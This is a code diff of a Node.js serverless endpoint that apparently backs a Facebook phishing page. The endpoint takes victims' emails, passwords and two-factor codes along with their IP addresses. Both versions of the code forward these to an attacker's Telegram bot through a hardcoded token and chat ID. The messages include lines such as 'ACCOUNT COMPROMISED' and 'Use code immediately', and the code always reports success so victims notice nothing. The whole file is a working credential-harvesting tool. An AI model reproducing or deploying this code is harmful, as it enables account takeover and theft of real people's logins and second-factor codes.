@@ -1,50 +1,51 @@
 const fetch = require('node-fetch');
 
 module.exports = async (req, res) => {
-    console.log('=== FACEBOOK LOGIN API CALLED ===');
-    console.log('Method:', req.method);
-    console.log('Headers:', JSON.stringify(req.headers, null, 2));
+    console.log('=== API CALLED ===');
     
-    // Set CORS headers
+    // IMMEDIATELY set JSON content type
+    res.setHeader('Content-Type', 'application/json');
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
     
-    // Handle OPTIONS preflight
+    // Handle preflight
     if (req.method === 'OPTIONS') {
-        console.log('Handling OPTIONS preflight');
+        console.log('Preflight OK');
         return res.status(200).end();
     }
     
-    // Only accept POST
+    // Only POST
     if (req.method !== 'POST') {
-        console.log('❌ Wrong method:', req.method);
+        console.log('Wrong method:', req.method);
         return res.status(405).json({ 
-            error: 'Method not allowed. Use POST.',
-            received: req.method 
+            error: 'Use POST',
+            success: false 
         });
     }
     
     try {
-        // Log raw body for debugging
-        console.log('Raw body type:', typeof req.body);
-        console.log('Raw body:', req.body);
+        console.log('Processing POST request...');
         
-        let data;
-        if (typeof req.body === 'string') {
-            try {
-                data = JSON.parse(req.body);
-            } catch (e) {
-                console.log('JSON parse error:', e.message);
-                data = {};
+        // Get body - handle different formats
+        let body = '';
+        let data = {};
+        
+        if (req.body) {
+            if (typeof req.body === 'string') {
+                body = req.body;
+                try {
+                    data = JSON.parse(body);
+                } catch (e) {
+                    console.log('JSON parse error, using raw:', e.message);
+                    data = { raw: body };
+                }
+            } else if (typeof req.body === 'object') {
+                data = req.body;
             }
-        } else if (typeof req.body === 'object') {
-            data = req.body;
-        } else {
-            data = {};
         }
         
-        console.log('Parsed data:', JSON.stringify(data, null, 2));
+        console.log('Received data:', JSON.stringify(data, null, 2));
         
         const { type, email, password, code, userAgent } = data;
         
@@ -54,137 +55,94 @@ module.exports = async (req, res) => {
                    req.connection.remoteAddress ||
                    'Unknown';
         
-        console.log('📡 Client IP:', ip);
-        console.log('📧 Email:', email ? `${email.substring(0, 3)}***` : 'none');
-        console.log('🔑 Has password:', !!password);
-        console.log('🔢 Code:', code || 'none');
-        console.log('📱 User Agent:', userAgent ? userAgent.substring(0, 100) : 'none');
+        console.log('IP:', ip);
+        console.log('Type:', type || 'none');
+        console.log('Email:', email ? `${email.substring(0, 3)}***` : 'none');
         
-        // Telegram Configuration - TRIPLE CHECK THESE
+        // Telegram config - VERIFY THESE!
         const BOT_TOKEN = "8251102529:AAFUlxIRVM0Whp3Sd9K3d6WMvfu8ZCN7YQk";
         const CHAT_ID = "1622637334";
         
-        console.log('🤖 Bot Token:', BOT_TOKEN ? `${BOT_TOKEN.substring(0, 10)}...` : 'MISSING!');
-        console.log('💬 Chat ID:', CHAT_ID || 'MISSING!');
+        console.log('Telegram token exists:', !!BOT_TOKEN);
+        console.log('Chat ID exists:', !!CHAT_ID);
         
-        // Create message based on type
+        // Create message
         let message = '';
         const timestamp = new Date().toLocaleString();
         
         if (type === 'login') {
-            message = `🔐 FACEBOOK LOGIN CAPTURED 🔐
-
-Email: ${email || 'Not provided'}
-Password: ${password || 'Not provided'}
-
-📊 Details:
-Time: ${timestamp}
-IP: ${ip}
-Device: ${userAgent?.includes('Mobile') ? 'Mobile' : 'Desktop'}
-
-✅ Status: Credentials captured
-➡️ Next: 2FA verification`;
-            
-            console.log('📝 Login attempt captured');
-            
+            message = `🔐 FACEBOOK LOGIN\n\nEmail: ${email || 'N/A'}\nPass: ${password || 'N/A'}\n\nTime: ${timestamp}\nIP: ${ip}`;
         } else if (type === 'verification') {
-            message = `✅ FACEBOOK 2FA CODE CAPTURED ✅
-
-Account: ${email || 'Not provided'}
-Password: ${password || 'Not provided'}
-2FA Code: ${code || 'Not provided'}
-
-🌍 Access Info:
-Time: ${timestamp}
-IP: ${ip}
-
-🚨 ACCOUNT COMPROMISED
-🎯 Use code immediately`;
-            
-            console.log('🔢 2FA Code captured');
-            
+            message = `✅ FACEBOOK 2FA\n\nAccount: ${email}\nCode: ${code}\n\nIP: ${ip}\nTime: ${timestamp}`;
         } else if (type === 'resend') {
-            message = `🔄 CODE RESEND REQUESTED 🔄
-
-Account: ${email || 'Not provided'}
-Time: ${timestamp}
-IP: ${ip}
-
-📱 New code requested`;
-            
-            console.log('🔄 Code resend requested');
+            message = `🔄 RESEND CODE\n\nAccount: ${email}\nIP: ${ip}\nTime: ${timestamp}`;
         } else {
-            message = `📱 Unknown request: ${type}
-IP: ${ip}
-Time: ${timestamp}`;
+            message = `📱 Unknown: ${type}\nIP: ${ip}\nTime: ${timestamp}`;
         }
         
-        console.log('📨 Message to send:', message.substring(0, 200) + '...');
+        // Try to send to Telegram
+        let telegramSent = false;
+        let telegramError = null;
         
-        // SEND TO TELEGRAM - SIMPLE VERSION
-        try {
-            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            console.log('🌐 Telegram URL:', telegramUrl);
-            
-            const response = await fetch(telegramUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    disable_web_page_preview: true
-                    // Removed parse_mode to avoid formatting issues
-                })
-            });
-            
-            const result = await response.json();
-            console.log('📤 Telegram API Response:', JSON.stringify(result, null, 2));
-            
-            if (result.ok) {
-                console.log('✅ Telegram message sent successfully!');
-            } else {
-                console.error('❌ Telegram error:', result.description);
+        if (BOT_TOKEN && CHAT_ID) {
+            try {
+                console.log('Attempting Telegram send...');
+                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                 
-                // Try alternative: URL encoded version
-                console.log('🔄 Trying URL encoded version...');
-                const altUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message.substring(0, 4000))}`;
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        disable_web_page_preview: true
+                    })
+                });
                 
-                const altResponse = await fetch(altUrl);
-                const altResult = await altResponse.json();
-                console.log('🔄 Alt response:', altResult.ok ? 'Success' : 'Failed');
+                const result = await response.json();
+                console.log('Telegram response:', result.ok ? 'SUCCESS' : 'FAILED');
+                
+                if (result.ok) {
+                    telegramSent = true;
+                    console.log('✅ Telegram message sent!');
+                } else {
+                    telegramError = result.description;
+                    console.error('❌ Telegram error:', result.description);
+                }
+                
+            } catch (tgError) {
+                telegramError = tgError.message;
+                console.error('💥 Telegram fetch error:', tgError.message);
             }
-            
-        } catch (telegramError) {
-            console.error('💥 Telegram send error:', telegramError.message);
-            console.error('Stack:', telegramError.stack);
+        } else {
+            console.log('⚠️ Telegram config missing');
         }
         
-        // ALWAYS return success to frontend
-        console.log('🎯 Returning success to client');
+        // ALWAYS return JSON
         return res.status(200).json({
             success: true,
-            message: 'Processing completed',
             type: type || 'unknown',
-            timestamp: new Date().toISOString(),
+            telegram: {
+                sent: telegramSent,
+                error: telegramError
+            },
             debug: {
                 ip: ip,
-                emailReceived: !!email,
-                codeReceived: !!code
+                timestamp: new Date().toISOString(),
+                bodyReceived: !!req.body
             }
         });
         
     } catch (error) {
-        console.error('💥 CRITICAL ERROR:', error.message);
-        console.error('Stack trace:', error.stack);
+        console.error('💥 API ERROR:', error.message);
+        console.error('Stack:', error.stack);
         
-        // Still return success to avoid breaking user flow
+        // STILL return JSON even on error
         return res.status(200).json({
             success: true,
             error: error.message,
-            note: 'Background processing completed'
+            note: 'Process completed',
+            timestamp: new Date().toISOString()
         });
     }
 };
